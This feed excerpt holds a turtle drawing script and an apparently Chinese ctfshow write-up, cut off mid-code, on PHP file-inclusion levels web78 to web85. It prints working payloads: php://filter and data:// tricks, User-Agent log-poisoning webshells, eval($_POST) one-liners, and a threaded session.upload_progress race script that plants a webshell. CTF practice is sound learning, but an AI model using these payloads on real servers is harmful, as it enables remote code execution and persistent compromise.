class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.setheading(95)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.circle(-37, 160)</span><br><span class="line">turtle.circle(-20, 50)</span><br><span class="line">turtle.circle(-200, 30)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"># 轮廓</span><br><span class="line"># 头顶</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-73, 230)</span><br><span class="line">turtle.pencolor(&quot;lightgray&quot;)</span><br><span class="line">turtle.pensize(3)</span><br><span class="line">turtle.fillcolor(&quot;white&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(20)</span><br><span class="line">turtle.circle(-250, 35)</span><br><span class="line"># 左耳</span><br><span class="line">turtle.setheading(50)</span><br><span class="line">turtle.circle(-42, 180)</span><br><span class="line"># 左侧</span><br><span class="line">turtle.setheading(-50)</span><br><span class="line">turtle.circle(-190, 30)</span><br><span class="line">turtle.circle(-320, 45)</span><br><span class="line"># 左腿</span><br><span class="line">turtle.circle(120, 30)</span><br><span class="line">turtle.circle(200, 12)</span><br><span class="line">turtle.circle(-18, 85)</span><br><span class="line">turtle.circle(-180, 23)</span><br><span class="line">turtle.circle(-20, 110)</span><br><span class="line">turtle.circle(15, 115)</span><br><span class="line">turtle.circle(100, 12)</span><br><span class="line"># 右腿</span><br><span class="line">turtle.circle(15, 120)</span><br><span class="line">turtle.circle(-15, 110)</span><br><span class="line">turtle.circle(-150, 30)</span><br><span class="line">turtle.circle(-15, 70)</span><br><span class="line">turtle.circle(-150, 10)</span><br><span class="line">turtle.circle(200, 35)</span><br><span class="line">turtle.circle(-150, 20)</span><br><span class="line"># 右手</span><br><span class="line">turtle.setheading(-120)</span><br><span class="line">turtle.circle(50, 30)</span><br><span class="line">turtle.circle(-35, 200)</span><br><span class="line">turtle.circle(-300, 23)</span><br><span class="line"># 右侧</span><br><span class="line">turtle.setheading(86)</span><br><span class="line">turtle.circle(-300, 26)</span><br><span class="line"># 右耳</span><br><span class="line">turtle.setheading(122)</span><br><span class="line">turtle.circle(-53, 160)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># 右耳内</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-130, 180)</span><br><span class="line">turtle.pencolor(&quot;black&quot;)</span><br><span class="line">turtle.pensize(1)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(120)</span><br><span class="line">turtle.circle(-28, 160)</span><br><span class="line">turtle.setheading(210)</span><br><span class="line">turtle.circle(150, 20)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># 左耳内</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(90, 230)</span><br><span class="line">turtle.setheading(40)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.circle(-30, 170)</span><br><span class="line">turtle.setheading(125)</span><br><span class="line">turtle.circle(150, 23)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># 右手内</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-180, -55)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.setheading(-120)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.circle(50, 30)</span><br><span class="line">turtle.circle(-27, 200)</span><br><span class="line">turtle.circle(-300, 20)</span><br><span class="line">turtle.setheading(-90)</span><br><span class="line">turtle.circle(300, 14)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># 左腿内</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(108, -168)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(-115)</span><br><span class="line">turtle.circle(110, 15)</span><br><span class="line">turtle.circle(200, 10)</span><br><span class="line">turtle.circle(-18, 80)</span><br><span class="line">turtle.circle(-180, 13)</span><br><span class="line">turtle.circle(-20, 90)</span><br><span class="line">turtle.circle(15, 60)</span><br><span class="line">turtle.setheading(42)</span><br><span class="line">turtle.circle(-200, 29)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"># 右腿内</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-38, -210)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(-155)</span><br><span class="line">turtle.circle(15, 100)</span><br><span class="line">turtle.circle(-10, 110)</span><br><span class="line">turtle.circle(-100, 30)</span><br><span class="line">turtle.circle(-15, 65)</span><br><span class="line">turtle.circle(-100, 10)</span><br><span class="line">turtle.circle(200, 15)</span><br><span class="line">turtle.setheading(-14)</span><br><span class="line">turtle.circle(-200, 27)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># 右眼</span><br><span class="line"># 眼圈</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-64, 120)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(40)</span><br><span class="line">turtle.circle(-35, 152)</span><br><span class="line">turtle.circle(-100, 50)</span><br><span class="line">turtle.circle(-35, 130)</span><br><span class="line">turtle.circle(-100, 50)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 眼珠</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-47, 55)</span><br><span class="line">turtle.fillcolor(&quot;white&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(25, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-45, 62)</span><br><span class="line">turtle.pencolor(&quot;darkslategray&quot;)</span><br><span class="line">turtle.fillcolor(&quot;darkslategray&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(19, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-45, 68)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(10, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-47, 86)</span><br><span class="line">turtle.pencolor(&quot;white&quot;)</span><br><span class="line">turtle.fillcolor(&quot;white&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(5, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># 左眼</span><br><span class="line"># 眼圈</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(51, 82)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(120)</span><br><span class="line">turtle.circle(-32, 152)</span><br><span class="line">turtle.circle(-100, 55)</span><br><span class="line">turtle.circle(-25, 120)</span><br><span class="line">turtle.circle(-120, 45)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"># 眼珠</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(79, 60)</span><br><span class="line">turtle.fillcolor(&quot;white&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(24, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(79, 64)</span><br><span class="line">turtle.pencolor(&quot;darkslategray&quot;)</span><br><span class="line">turtle.fillcolor(&quot;darkslategray&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(19, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(79, 70)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(10, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(79, 88)</span><br><span class="line">turtle.pencolor(&quot;white&quot;)</span><br><span class="line">turtle.fillcolor(&quot;white&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(5, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># 鼻子</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(37, 80)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.circle(-8, 130)</span><br><span class="line">turtle.circle(-22, 100)</span><br><span class="line">turtle.circle(-8, 130)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># 嘴</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-15, 48)</span><br><span class="line">turtle.setheading(-36)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.circle(60, 70)</span><br><span class="line">turtle.setheading(-132)</span><br><span class="line">turtle.circle(-45, 100)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># 彩虹圈</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-135, 120)</span><br><span class="line">turtle.pensize(5)</span><br><span class="line">turtle.pencolor(&quot;cyan&quot;)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(60)</span><br><span class="line">turtle.circle(-165, 150)</span><br><span class="line">turtle.circle(-130, 78)</span><br><span class="line">turtle.circle(-250, 30)</span><br><span class="line">turtle.circle(-138, 105)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-131, 116)</span><br><span class="line">turtle.pencolor(&quot;slateblue&quot;)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(60)</span><br><span class="line">turtle.circle(-160, 144)</span><br><span class="line">turtle.circle(-120, 78)</span><br><span class="line">turtle.circle(-242, 30)</span><br><span class="line">turtle.circle(-135, 105)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-127, 112)</span><br><span class="line">turtle.pencolor(&quot;orangered&quot;)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(60)</span><br><span class="line">turtle.circle(-155, 136)</span><br><span class="line">turtle.circle(-116, 86)</span><br><span class="line">turtle.circle(-220, 30)</span><br><span class="line">turtle.circle(-134, 103)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-123, 108)</span><br><span class="line">turtle.pencolor(&quot;gold&quot;)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(60)</span><br><span class="line">turtle.circle(-150, 136)</span><br><span class="line">turtle.circle(-104, 86)</span><br><span class="line">turtle.circle(-220, 30)</span><br><span class="line">turtle.circle(-126, 102)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-120, 104)</span><br><span class="line">turtle.pencolor(&quot;greenyellow&quot;)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(60)</span><br><span class="line">turtle.circle(-145, 136)</span><br><span class="line">turtle.circle(-90, 83)</span><br><span class="line">turtle.circle(-220, 30)</span><br><span class="line">turtle.circle(-120, 100)</span><br><span class="line">turtle.penup()</span><br><span class="line"></span><br><span class="line"># 爱心</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(220, 115)</span><br><span class="line">turtle.pencolor(&quot;brown&quot;)</span><br><span class="line">turtle.pensize(1)</span><br><span class="line">turtle.fillcolor(&quot;brown&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(36)</span><br><span class="line">turtle.circle(-8, 180)</span><br><span class="line">turtle.circle(-60, 24)</span><br><span class="line">turtle.setheading(110)</span><br><span class="line">turtle.circle(-60, 24)</span><br><span class="line">turtle.circle(-8, 180)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># 五环</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-5, -170)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pencolor(&quot;blue&quot;)</span><br><span class="line">turtle.circle(6)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(10, -170)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pencolor(&quot;black&quot;)</span><br><span class="line">turtle.circle(6)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(25, -170)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pencolor(&quot;brown&quot;)</span><br><span class="line">turtle.circle(6)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(2, -175)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pencolor(&quot;lightgoldenrod&quot;)</span><br><span class="line">turtle.circle(6)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(16, -175)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pencolor(&quot;green&quot;)</span><br><span class="line">turtle.circle(6)</span><br><span class="line">turtle.penup()</span><br><span class="line"></span><br><span class="line">turtle.pencolor(&quot;black&quot;)</span><br><span class="line">turtle.goto(-16, -160)</span><br><span class="line">turtle.write(&quot;BEIJING 2022&quot;, font=(&#x27;Arial&#x27;, 10, &#x27;bold italic&#x27;))</span><br><span class="line">turtle.hideturtle()</span><br><span class="line"></span><br><span class="line">turtle.done()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;送你一个冰墩墩哦-turtle&quot;&gt;&lt;a href=&quot;#送你一个冰墩墩哦-turtle&quot; class=&quot;headerlink&quot; title=&quot;送你一个冰墩墩哦(turtle)~&quot;&gt;&lt;/a&gt;送你一个冰墩墩哦(turtle)~&lt;/h1&gt;&lt;p&gt;今天在空间发了一个说说，是用</summary>
      
    
    
    
    <category term="闲聊" scheme="http://websec.space/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="闲聊" scheme="http://websec.space/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow文件包含</title>
    <link href="http://websec.space/2022/02/06/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://websec.space/2022/02/06/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2022-02-05T16:00:00.000Z</published>
    <updated>2022-02-06T15:58:20.551Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow文件包含"><a href="#ctfshow文件包含" class="headerlink" title="ctfshow文件包含"></a>ctfshow文件包含</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php被过滤了，使用data://</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></pre></td></tr></table></figure><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了php和data，不慌</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">包含日志文件 进行getshell 日志文件路径： ?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>采用UA传入一句话木马</p><p>直接执行</p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>故技重施！</p><p>稍微改一下一句话木马的头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST[1]); ?&gt;</span><br></pre></td></tr></table></figure><h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没玩过，没思路，爪巴       </p><p><a href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p><p>利用session.upload_progress进行文件包含</p><blockquote><ol><li><p>存在文件包含漏洞</p></li><li><p>知道session文件存放路径，可以尝试默认路径</p></li><li><p>具有读取和写入session文件的权限</p></li></ol></blockquote><p>exp，但是现在已经不能做了就写写思路:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">url=&#x27;http://b1bd9036-7201-48cf-ae78-5a33fd906d85.challenge.ctf.show/&#x27;</span><br><span class="line">sessionid=&#x27;ctfshow&#x27;</span><br><span class="line">data=&#123;</span><br><span class="line">&quot;1&quot;:&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br><span class="line">&#125;</span><br><span class="line">#&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">def write(session):</span><br><span class="line">fileBytes = io.BytesIO(b&#x27;a&#x27;*1024*50)</span><br><span class="line">while True:</span><br><span class="line">response=session.post(url,</span><br><span class="line">data=&#123;</span><br><span class="line">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br><span class="line">&#125;,</span><br><span class="line">cookies=&#123;</span><br><span class="line">&#x27;PHPSESSID&#x27;:sessionid</span><br><span class="line">&#125;,</span><br><span class="line">files=&#123;</span><br><span class="line">&#x27;file&#x27;:(&#x27;ctfshow.jpg&#x27;,fileBytes)</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def read(session):</span><br><span class="line">while True:</span><br><span class="line">response=session.post(url+&#x27;?file=/tmp/sess_&#x27;+sessionid,data=data,</span><br><span class="line">cookies=&#123;</span><br><span class="line">&#x27;PHPSESSID&#x27;:sessionid</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">resposne2=session.get(url+&#x27;2.php&#x27;);</span><br><span class="line">if resposne2.status_code==200:</span><br><span class="line">print(&#x27;++++++done++++++&#x27;)</span><br><span class="line">else:</span><br><span class="line">print(resposne2.status_code)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">evnet=threading.Event()</span><br><span class="line">with requests.session() as session:</span><br><span class="line">for i in range(20):</span><br><span class="line">threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">for i in range(20):</span><br><span class="line">threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">evnet.set()</span><br></pre></td></tr></table></figure><h2 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h2><p>故技重施</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"></span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf /tmp/*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为开了多线程，82的脚本依然管用。</p><h2 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$content</span>, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span 